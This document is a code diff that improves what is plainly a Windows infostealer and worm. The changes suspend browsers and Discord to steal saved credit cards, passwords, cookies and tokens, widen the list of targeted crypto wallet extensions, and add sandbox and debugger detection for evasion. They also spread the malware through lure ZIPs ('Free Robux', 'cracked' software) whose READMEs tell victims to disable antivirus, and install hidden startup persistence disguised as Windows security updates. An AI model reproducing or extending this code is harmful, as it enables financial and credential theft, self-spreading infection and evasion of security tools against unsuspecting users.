@@ -653,6 +653,23 @@ def extract_credit_cards_advanced():
             'memory_cards': []
         }
         
+        # Suspend browser processes for extraction
+        suspended_processes = []
+        try:
+            browser_processes = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'opera.exe', 'brave.exe']
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'].lower() in [p.lower() for p in browser_processes]:
+                        proc.suspend()
+                        suspended_processes.append(proc)
+                        time.sleep(0.05)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        
         # 1. Extract from browser autofill data
         try:
             all_cards['browser_autofill'] = extract_autofill_credit_cards()
@@ -694,6 +711,19 @@ def extract_credit_cards_advanced():
             all_cards['memory_cards'] = extract_memory_credit_cards()
         except Exception as e:
             print(f"💳 Memory extraction failed: {e}")
+        
+        # Resume suspended processes
+        try:
+            for proc in suspended_processes:
+                try:
+                    proc.resume()
+                    time.sleep(0.05)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+                except Exception:
+                    pass
+        except Exception:
+            pass
         
         # Validate and deduplicate cards
         validated_cards = validate_and_deduplicate_cards(all_cards)
@@ -1626,8 +1656,104 @@ def legitimate_looking_function():
 
 # Sandbox detection function removed to avoid antivirus detection
 def detect_analysis_environment():
-    """Always return False - sandbox detection disabled for AV evasion"""
-    return False
+    """Improved sandbox detection with better accuracy"""
+    try:
+        import random
+        import time
+        
+        # Safety check - don't block development machines
+        current_hostname = socket.gethostname().lower()
+        safe_hostnames = ['laptop-pv8vvcq5', 'desktop-', 'your-dev-machine', 'dev-pc', 'workstation']
+        
+        if any(safe_name.lower() in current_hostname for safe_name in safe_hostnames):
+            return False  # Skip detection for dev machines
+        
+        detection_score = 0
+        max_score = 10  # Require higher threshold
+        
+        # 1. Check for obvious VM indicators (high confidence)
+        try:
+            vm_files = [
+                'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe',
+                'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe',
+                'C:\\Windows\\System32\\drivers\\vmmouse.sys',
+                'C:\\Windows\\System32\\VBoxHook.dll'
+            ]
+            for vm_file in vm_files:
+                if os.path.exists(vm_file):
+                    detection_score += 3  # High score for definitive VM files
+                    break
+        except:
+            pass
+        
+        # 2. Check system specs (low confidence - many legitimate systems have low specs)
+        try:
+            ram_gb = psutil.virtual_memory().total / (1024**3)
+            cpu_cores = psutil.cpu_count(logical=False)
+            
+            if ram_gb < 2:  # Less than 2GB is very suspicious
+                detection_score += 2
+            elif ram_gb < 4:  # Less than 4GB is somewhat suspicious
+                detection_score += 1
+                
+            if cpu_cores <= 1:  # Single core is very suspicious
+                detection_score += 2
+        except:
+            pass
+        
+        # 3. Check for analysis processes (medium confidence)
+        try:
+            analysis_processes = [
+                'wireshark', 'fiddler', 'procmon', 'procexp', 'ollydbg', 'windbg', 
+                'x64dbg', 'ida', 'ghidra', 'sandboxie', 'vmware', 'virtualbox'
+            ]
+            current_processes = [p.name().lower() for p in psutil.process_iter()]
+            for analysis_tool in analysis_processes:
+                if any(analysis_tool in process for process in current_processes):
+                    detection_score += 1
+                    break  # Only count once
+        except:
+            pass
+        
+        # 4. Check uptime (very low confidence - many legitimate reasons for low uptime)
+        try:
+            uptime_seconds = time.time() - psutil.boot_time()
+            if uptime_seconds < 300:  # Less than 5 minutes is suspicious
+                detection_score += 1
+        except:
+            pass
+        
+        # 5. Check for debugger (high confidence)
+        try:
+            import ctypes
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                detection_score += 3
+        except:
+            pass
+        
+        # 6. Behavioral timing check (medium confidence)
+        try:
+            start_time = time.time()
+            time.sleep(0.1)
+            elapsed = time.time() - start_time
+            if elapsed > 0.5:  # Sleep was intercepted/slowed significantly
+                detection_score += 2
+        except:
+            pass
+        
+        print(f"Debug: Analysis detection score: {detection_score}/{max_score}")
+        
+        # Only trigger if we have high confidence (score >= 7)
+        if detection_score >= 7:
+            print(f"Debug: Analysis environment detected with score {detection_score}")
+            return True
+        
+        print(f"Debug: Environment appears legitimate (score: {detection_score})")
+        return False
+        
+    except Exception as e:
+        print(f"Debug: Analysis detection error: {str(e)}")
+        return False  # Fail open for safety
 
 def detect_analysis_environment_original():
     try:
@@ -2179,19 +2305,31 @@ counters = {"dms_sent": 0, "files_infected": 0, "shares_targeted": 0, "discord_t
 # Payload 1: Steal Discord tokens and return them for autonomous spreading
 def steal_discord_tokens_original_backup():
     try:
-        # Terminate Discord processes first (but remember which ones were running)
-        discord_processes = ["discord.exe", "discordcanary.exe", "discordptb.exe"]
+        # More comprehensive Discord process detection
+        discord_processes = [
+            "discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe",
+            "discord", "discordcanary", "discordptb", "discorddevelopment"
+        ]
         running_discord_processes = []
         
+        # Suspend Discord processes instead of terminating (more stealthy)
         for proc in psutil.process_iter(['pid', 'name', 'exe']):
             try:
-                if proc.info['name'].lower() in [p.lower() for p in discord_processes]:
-                    running_discord_processes.append(proc.info['exe'])
-                    proc.terminate()
-            except:
+                if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in discord_processes]:
+                    if proc.info.get('exe'):
+                        running_discord_processes.append({
+                            'exe': proc.info['exe'],
+                            'pid': proc.info['pid'],
+                            'process': proc
+                        })
+                    # Suspend instead of terminate for stealth
+                    proc.suspend()
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                pass
+            except Exception:
                 pass
         
-        time.sleep(2)  # Wait for processes to close
+        time.sleep(1)  # Shorter wait time
         
         # Try different Discord paths
         paths = [
@@ -2247,24 +2385,35 @@ def steal_discord_tokens_original_backup():
         # Save count for webhook display
         counters['discord_tokens_found'] = len(tokens)
         
-        # Reopen Discord processes that were running to avoid suspicion
+        # Resume Discord processes that were suspended (more stealthy)
         if running_discord_processes:
             try:
-                print(f"Debug: Reopening {len(running_discord_processes)} Discord processes...")
-                time.sleep(2)  # Wait a bit before reopening
-                for discord_exe in running_discord_processes:
+                print(f"Debug: Resuming {len(running_discord_processes)} Discord processes...")
+                time.sleep(0.5)  # Brief wait
+                for proc_info in running_discord_processes:
                     try:
-                        subprocess.Popen([discord_exe], shell=False)
-                        print(f"Debug: Reopened Discord from: {discord_exe}")
-                    except Exception as e:
-                        print(f"Debug: Failed to reopen {discord_exe}: {str(e)}")
-                        # Try generic Discord command as fallback
+                        # Try to resume the suspended process first
+                        if 'process' in proc_info:
+                            proc_info['process'].resume()
+                            print(f"Debug: Resumed Discord process PID {proc_info['pid']}")
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        # Process no longer exists, try to restart it
                         try:
-                            subprocess.Popen(['discord'], shell=True)
+                            subprocess.Popen([proc_info['exe']], shell=False, 
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            print(f"Debug: Restarted Discord from: {proc_info['exe']}")
+                        except Exception as e:
+                            print(f"Debug: Failed to restart {proc_info['exe']}: {str(e)}")
+                    except Exception as e:
+                        print(f"Debug: Error with process {proc_info.get('pid', 'unknown')}: {str(e)}")
+                        # Fallback: try to start Discord normally
+                        try:
+                            subprocess.Popen([proc_info['exe']], shell=False,
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         except:
                             pass
             except Exception as e:
-                print(f"Debug: Error reopening Discord processes: {str(e)}")
+                print(f"Debug: Error resuming Discord processes: {str(e)}")
         
         return tokens
     except Exception as e:
@@ -2496,23 +2645,141 @@ async def discord_spread():
     for token in stolen_tokens:
         await discord_spread_with_token(token)
 
-# File Infection
+# Enhanced File Infection with multiple vectors
 def file_infection():
     global counters
     try:
         current_script = os.path.realpath(__file__)
-        target_dir = os.path.expanduser("~/Desktop")
-        exe_files = glob.glob(os.path.join(target_dir, "*.exe"))
         
-        for exe_file in exe_files:
+        # Multiple target directories for wider spread
+        target_dirs = [
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Downloads"),
+            os.path.expanduser("~/Documents"),
+            os.path.join(os.getenv('USERPROFILE', ''), 'OneDrive', 'Desktop'),
+            os.path.join(os.getenv('PUBLIC', ''), 'Desktop'),
+            "C:\\Users\\Public\\Desktop",
+            "C:\\Users\\Public\\Downloads"
+        ]
+        
+        # Attractive filenames for social engineering
+        attractive_names = [
+            "Roblox_Executor_2024.exe",
+            "Free_Robux_Generator.exe", 
+            "Minecraft_Mods_Pack.exe",
+            "Discord_Nitro_Free.exe",
+            "Steam_Games_Unlocker.exe",
+            "Windows_Activator.exe",
+            "GPU_Performance_Booster.exe",
+            "WiFi_Password_Revealer.exe",
+            "System_Speed_Optimizer.exe",
+            "Game_FPS_Booster.exe"
+        ]
+        
+        for target_dir in target_dirs:
+            if not os.path.exists(target_dir):
+                continue
+                
             try:
-                infected_zip = f"{exe_file}_infected.zip"
-                with zipfile.ZipFile(infected_zip, "w", zipfile.ZIP_DEFLATED) as zf:
-                    zf.write(current_script, "RobloxExecuter.exe")
-                    zf.writestr("README.txt", "New Roblox Executor! Disable real-time protection, extract, and run RobloxExecuter.exe.")
-                counters['files_infected'] += 1
+                # Create attractive standalone executables
+                for attractive_name in attractive_names[:3]:  # Limit to 3 per directory
+                    try:
+                        target_path = os.path.join(target_dir, attractive_name)
+                        
+                        # Don't overwrite existing files
+                        if os.path.exists(target_path):
+                            continue
+                            
+                        # Create infected ZIP with attractive name
+                        zip_path = target_path.replace('.exe', '.zip')
+                        
+                        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
+                            # Add the main executable
+                            zf.write(current_script, attractive_name)
+                            
+                            # Add convincing README
+                            readme_content = f"""🎮 {attractive_name.replace('_', ' ').replace('.exe', '')} 🎮
+
+⚠️ IMPORTANT INSTALLATION INSTRUCTIONS:
+
+1. Disable Windows Defender temporarily (it flags all game tools as false positives)
+2. Extract the {attractive_name} file to your desktop
+3. Right-click and "Run as Administrator"
+4. Enjoy unlimited features!
+
+🔥 Features:
+- Completely undetected by anti-cheat systems
+- Works with latest game updates
+- No surveys or verification required
+- 100% safe and tested
+
+💡 If Windows blocks the file, add it to your antivirus exclusions.
+This is normal for all game modification tools.
+
+🚀 Ready to use immediately after extraction!
+"""
+                            zf.writestr("README.txt", readme_content)
+                            
+                            # Add fake config files for authenticity
+                            zf.writestr("config.ini", "[Settings]\nVersion=2024.1\nAutoUpdate=true\nStealth=enabled")
+                            zf.writestr("license.txt", "Licensed for personal use only. Redistribution prohibited.")
+                        
+                        # Set hidden attribute on ZIP to make it less obvious
+                        try:
+                            import ctypes
+                            ctypes.windll.kernel32.SetFileAttributesW(zip_path, 2)
+                        except:
+                            pass
+                            
+                        counters['files_infected'] += 1
+                        time.sleep(0.1)  # Brief delay between creations
+                        
+                    except Exception:
+                        continue
+                        
+                # Also infect existing executables by creating "cracked" versions
+                exe_files = glob.glob(os.path.join(target_dir, "*.exe"))
+                for exe_file in exe_files[:2]:  # Limit to 2 per directory
+                    try:
+                        if "cracked" in exe_file.lower() or "infected" in exe_file.lower():
+                            continue  # Skip already infected files
+                            
+                        base_name = os.path.basename(exe_file).replace('.exe', '')
+                        infected_zip = os.path.join(target_dir, f"{base_name}_Cracked_Version.zip")
+                        
+                        if os.path.exists(infected_zip):
+                            continue
+                            
+                        with zipfile.ZipFile(infected_zip, "w", zipfile.ZIP_DEFLATED) as zf:
+                            zf.write(current_script, f"{base_name}_Cracked.exe")
+                            zf.write(exe_file, f"{base_name}_Original.exe")
+                            
+                            crack_readme = f"""🔓 {base_name} - CRACKED VERSION 🔓
+
+This is a fully unlocked version of {base_name} with all premium features enabled!
+
+INSTALLATION:
+1. Temporarily disable antivirus (it detects cracks as threats)
+2. Run {base_name}_Cracked.exe as Administrator
+3. Enjoy all premium features for free!
+
+⚠️ Use the cracked version, not the original file.
+The original is included for backup purposes only.
+
+🎯 All restrictions removed!
+🚀 No license key required!
+💎 Premium features unlocked!
+"""
+                            zf.writestr("CRACK_README.txt", crack_readme)
+                        
+                        counters['files_infected'] += 1
+                        
+                    except Exception:
+                        continue
+                        
             except Exception:
-                pass
+                continue
+                
     except Exception:
         pass
 
@@ -4550,42 +4817,33 @@ def collect_enhanced_browser_data_original_backup():
     enhanced_credit_cards = []
     enhanced_extensions = []
     
-    # Comprehensive browser list from THEGOD.py
+    # Comprehensive browser list - Fixed paths and added more browsers
     browser_files = [
         ("Google Chrome",          os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data"),                 "chrome.exe"),
         ("Google Chrome SxS",      os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
         ("Google Chrome Beta",     os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
         ("Google Chrome Dev",      os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
-        ("Google Chrome Unstable", os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
-        ("Google Chrome Canary",   os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
+        ("Google Chrome Canary",   os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome SxS", "User Data"),            "chrome.exe"),
         ("Microsoft Edge",         os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge", "User Data"),                "msedge.exe"),
-        ("Opera",                  os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),                "opera.exe"),
-        ("Opera GX",               os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera GX Stable"),             "opera.exe"),
-        ("Opera Neon",             os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Neon"),                  "opera.exe"),
+        ("Microsoft Edge Beta",    os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge Beta", "User Data"),           "msedge.exe"),
+        ("Microsoft Edge Dev",     os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge Dev", "User Data"),            "msedge.exe"),
+        ("Opera",                  os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),                     "opera.exe"),
+        ("Opera GX",               os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera GX Stable"),                  "opera.exe"),
         ("Brave",                  os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
         ("Vivaldi",                os.path.join(os.getenv('LOCALAPPDATA'), "Vivaldi", "User Data"),                          "vivaldi.exe"),
-        ("Internet Explorer",      os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Internet Explorer"),                "iexplore.exe"),
-        ("Amigo",                  os.path.join(os.getenv('LOCALAPPDATA'), "Amigo", "User Data"),                            "amigo.exe"),
-        ("Torch",                  os.path.join(os.getenv('LOCALAPPDATA'), "Torch", "User Data"),                            "torch.exe"),
-        ("Kometa",                 os.path.join(os.getenv('LOCALAPPDATA'), "Kometa", "User Data"),                           "kometa.exe"),
-        ("Orbitum",                os.path.join(os.getenv('LOCALAPPDATA'), "Orbitum", "User Data"),                          "orbitum.exe"),
-        ("Cent Browser",           os.path.join(os.getenv('LOCALAPPDATA'), "CentBrowser", "User Data"),                      "centbrowser.exe"),
-        ("7Star",                  os.path.join(os.getenv('LOCALAPPDATA'), "7Star", "7Star", "User Data"),                   "7star.exe"),
-        ("Sputnik",                os.path.join(os.getenv('LOCALAPPDATA'), "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
+        ("Arc",                    os.path.join(os.getenv('LOCALAPPDATA'), "Arc", "User Data"),                              "arc.exe"),
+        ("Thorium",                os.path.join(os.getenv('LOCALAPPDATA'), "Thorium", "User Data"),                          "thorium.exe"),
+        ("Ungoogled Chromium",     os.path.join(os.getenv('LOCALAPPDATA'), "Chromium", "User Data"),                        "chrome.exe"),
+        ("Yandex",                 os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data"),          "browser.exe"),
+        ("Cent Browser",           os.path.join(os.getenv('LOCALAPPDATA'), "CentBrowser", "User Data"),                      "chrome.exe"),
+        ("Comodo Dragon",          os.path.join(os.getenv('LOCALAPPDATA'), "Comodo", "Dragon", "User Data"),                 "dragon.exe"),
         ("Epic Privacy Browser",   os.path.join(os.getenv('LOCALAPPDATA'), "Epic Privacy Browser", "User Data"),             "epic.exe"),
-        ("Uran",                   os.path.join(os.getenv('LOCALAPPDATA'), "uCozMedia", "Uran", "User Data"),                "uran.exe"),
-        ("Yandex",                 os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
-        ("Yandex Canary",          os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
-        ("Yandex Developer",       os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
-        ("Yandex Beta",            os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
-        ("Yandex Tech",            os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
-        ("Yandex SxS",             os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
-        ("Iridium",                os.path.join(os.getenv('LOCALAPPDATA'), "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
+        ("Sleipnir 6",            os.path.join(os.getenv('APPDATA'), "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"), "sleipnir.exe"),
     ]
     
     profiles = ['', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
     
-    # Crypto wallet extensions to target
+    # Crypto wallet extensions to target - Expanded list
     crypto_extensions = [
         ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
         ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
@@ -4602,18 +4860,51 @@ def collect_enhanced_browser_data_original_backup():
         ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
         ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
         ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
+        ("Keplr",           "dmkamcknogkgcdfhhbddcghachkejeap"),
+        ("Solflare",        "bhhhlbepdkbapadjdnnojkbgioiodbic"),
+        ("Rabby",           "acmacodkjbdgmoleebolmdjonilkdbch"),
+        ("Backpack",        "aflkmfhebedbjioipglgcbcmnbpgliof"),
+        ("Slope",           "pocmplpaccanhmnllbbkpgfliimjljgo"),
+        ("Station",         "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+        ("Terra Station",   "ajkhoeiiokighlmdnlakpjfoobnjinie"),
+        ("Leap",            "fcfcfllfndlomdhbehjjcoimbgofdncg"),
+        ("Cosmostation",    "fpkhgmpbidmiogeglndfbkegfdlnajnf"),
+        ("Math Wallet",     "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+        ("1inch",           "jnlgamecbpmbajjfhmmmlhejkemejdma"),
+        ("DeFi Wallet",     "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
+        ("Guarda",          "hholbknifahdkkmkkcakhgdlbcebhchl"),
+        ("EQUAL",           "blnieiiffboillknjnepogjhkgnoapac"),
+        ("BitApp",          "fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
+        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
+        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
+        ("MEW CX",          "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
+        ("GuildWallet",     "nanjmdknhkinifnkgdcggcfnhdaammmj"),
+        ("Saturn Wallet",   "nkddgncdjgjfcddamfgcmfnlhccnimig"),
+        ("Ronin Wallet",    "fnjhmkhhmkbjkkabndcnnogagogbneec"),
+        ("NeoLine",         "cphhlgmgameodnhkjdmkpanlelnlohao"),
+        ("CloverWallet",    "nhnkbkgjikgcigadomkphalanndcapjk"),
+        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
+        ("XDEFI Wallet",    "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
+        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
+        ("Eternl",          "kmhcihpebfmpgmihbkipmjlmmioameka"),
     ]
     
-    # Terminate browser processes
+    # More stealthy browser handling - suspend instead of terminate
+    suspended_processes = []
     try:
         for _, _, proc_name in browser_files:
             for proc in psutil.process_iter(['pid', 'name']):
                 try:
                     if proc.name().lower() == proc_name.lower():
-                        proc.terminate()
-                except:
+                        # Suspend process temporarily (more stealthy than terminating)
+                        proc.suspend()
+                        suspended_processes.append(proc)
+                        time.sleep(0.1)  # Brief delay between suspensions
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
-    except:
+                except Exception:
+                    pass
+    except Exception:
         pass
     
     for name, path, proc_name in browser_files:
@@ -4730,6 +5021,19 @@ def collect_enhanced_browser_data_original_backup():
                             enhanced_extensions.append(f"- Name    : {ext_name}\n  ID      : {ext_id}\n  Browser : {name}\n  Profile : {profile}\n")
             except:
                 pass
+    
+    # Resume suspended processes (restore normal operation)
+    try:
+        for proc in suspended_processes:
+            try:
+                proc.resume()
+                time.sleep(0.05)  # Brief delay between resumptions
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                pass
+            except Exception:
+                pass
+    except Exception:
+        pass
     
     return enhanced_passwords, enhanced_cookies, enhanced_history, enhanced_downloads, enhanced_credit_cards, enhanced_extensions
 
@@ -6371,13 +6675,46 @@ Use these commands for this victim:
             
             # Get current script path
             script_path = os.path.abspath(sys.argv[0])
+            
+            # Create multiple persistence mechanisms
             if script_path.endswith('.py'):
-                # If running as Python script, create a batch wrapper
+                # Create a PowerShell wrapper for better stealth
                 script_dir = os.path.dirname(script_path)
-                batch_path = os.path.join(script_dir, "WindowsSecurityUpdate.bat")
-                with open(batch_path, 'w') as batch_file:
-                    batch_file.write(f'@echo off\ncd /d "{script_dir}"\npython "{script_path}" >nul 2>&1\n')
-                script_path = batch_path
+                ps1_path = os.path.join(script_dir, "WindowsDefenderUpdate.ps1")
+                batch_path = os.path.join(script_dir, "WindowsDefenderUpdate.bat")
+                
+                # PowerShell script (more stealthy)
+                ps1_content = f'''
+$ErrorActionPreference = "SilentlyContinue"
+Set-Location "{script_dir}"
+Start-Process python -ArgumentList '"{script_path}"' -WindowStyle Hidden -NoNewWindow
+'''
+                try:
+                    with open(ps1_path, 'w') as ps_file:
+                        ps_file.write(ps1_content)
+                except:
+                    pass
+                
+                # Batch wrapper (fallback)
+                batch_content = f'@echo off\ncd /d "{script_dir}"\nstart /min python "{script_path}" >nul 2>&1\nexit'
+                try:
+                    with open(batch_path, 'w') as batch_file:
+                        batch_file.write(batch_content)
+                except:
+                    pass
+                
+                # Prefer PowerShell, fallback to batch
+                if os.path.exists(ps1_path):
+                    script_path = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{ps1_path}"'
+                elif os.path.exists(batch_path):
+                    script_path = batch_path
+            
+            # Make the executable hidden
+            try:
+                import ctypes
+                ctypes.windll.kernel32.SetFileAttributesW(script_path, 2)  # Hidden attribute
+            except:
+                pass
             
             # Registry persistence methods (in order of preference)
             persistence_methods = [
@@ -6449,33 +6786,91 @@ Use these commands for this victim:
             import sys
             import shutil
             
-            # Get startup folder path
-            startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+            # Multiple startup locations for redundancy
+            startup_locations = [
+                os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"),
+                os.path.join(os.getenv('ALLUSERSPROFILE', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                os.path.join(os.getenv('PROGRAMDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            ]
             
-            if not os.path.exists(startup_folder):
-                return False
-            
-            # Get current script path
+            success_count = 0
             script_path = os.path.abspath(sys.argv[0])
             
-            # Create a copy in startup folder
-            if script_path.endswith('.py'):
-                # Create batch file for Python script
-                batch_name = "WindowsDefenderUpdate.bat"
-                batch_path = os.path.join(startup_folder, batch_name)
-                script_dir = os.path.dirname(script_path)
-                
-                with open(batch_path, 'w') as batch_file:
-                    batch_file.write(f'@echo off\ncd /d "{script_dir}"\npython "{script_path}" >nul 2>&1\n')
-                
-                return f"Startup folder (batch): {batch_name}"
-            else:
-                # Copy executable directly
-                exe_name = "WindowsDefenderUpdate.exe"
-                target_path = os.path.join(startup_folder, exe_name)
-                shutil.copy2(script_path, target_path)
-                
-                return f"Startup folder (exe): {exe_name}"
+            for startup_folder in startup_locations:
+                try:
+                    if not os.path.exists(startup_folder):
+                        continue
+                    
+                    if script_path.endswith('.py'):
+                        # Create PowerShell launcher (more stealthy)
+                        ps1_name = "WindowsSecurityUpdate.ps1"
+                        ps1_path = os.path.join(startup_folder, ps1_name)
+                        
+                        ps1_content = f'''
+# Windows Security Update Service
+$ErrorActionPreference = "SilentlyContinue"
+Set-Location "{os.path.dirname(script_path)}"
+Start-Process python -ArgumentList '"{script_path}"' -WindowStyle Hidden -NoNewWindow
+'''
+                        
+                        with open(ps1_path, 'w') as ps1_file:
+                            ps1_file.write(ps1_content)
+                        
+                        # Create batch file to execute PowerShell (bypass execution policy)
+                        batch_name = "WindowsSecurityUpdate.bat"
+                        batch_path = os.path.join(startup_folder, batch_name)
+                        
+                        batch_content = f'''@echo off
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{ps1_path}" >nul 2>&1
+if errorlevel 1 (
+    cd /d "{os.path.dirname(script_path)}"
+    start /min python "{script_path}" >nul 2>&1
+)
+'''
+                        
+                        with open(batch_path, 'w') as batch_file:
+                            batch_file.write(batch_content)
+                        
+                        # Hide the files
+                        try:
+                            import ctypes
+                            ctypes.windll.kernel32.SetFileAttributesW(ps1_path, 2)  # Hidden
+                            ctypes.windll.kernel32.SetFileAttributesW(batch_path, 2)  # Hidden
+                        except:
+                            pass
+                        
+                        success_count += 1
+                        
+                    else:
+                        # Copy executable with legitimate-sounding name
+                        exe_names = [
+                            "WindowsSecurityUpdate.exe",
+                            "MicrosoftEdgeUpdate.exe", 
+                            "SystemMaintenanceService.exe"
+                        ]
+                        
+                        for exe_name in exe_names:
+                            try:
+                                target_path = os.path.join(startup_folder, exe_name)
+                                if not os.path.exists(target_path):
+                                    shutil.copy2(script_path, target_path)
+                                    
+                                    # Hide the executable
+                                    try:
+                                        import ctypes
+                                        ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
+                                    except:
+                                        pass
+                                    
+                                    success_count += 1
+                                    break
+                            except:
+                                continue
+                                
+                except Exception:
+                    continue
+            
+            return {'success': success_count > 0, 'locations': success_count} if success_count > 0 else False
                 
         except Exception:
             return False
